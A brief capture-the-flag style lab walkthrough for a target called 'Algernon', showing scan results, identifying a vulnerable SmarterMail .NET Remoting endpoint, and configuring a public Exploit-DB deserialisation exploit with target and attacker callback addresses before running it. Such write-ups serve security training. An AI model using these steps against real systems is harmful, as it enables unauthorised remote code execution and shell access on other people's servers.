# Algernon

### Enumeration

```
9998/tcp  open  http          Microsoft IIS httpd 10.0
17001/tcp open  remoting      MS .NET Remoting services
```

There is a SmarterMail v17 service on 9998.

SmarterMail Build 6985 - Remote Code Execution&#x20;

https://www.exploit-db.com/exploits/49216

> SmarterMail before build 6985 provides a .NET remoting endpoint
>
> which is vulnerable to a .NET deserialisation attack.

### Access

Edit relevant parts of the exploit file.

```
HOST='192.168.157.65'
PORT=17001
LHOST='192.168.49.157'
LPORT=80
```

```
$ python3 49216
```
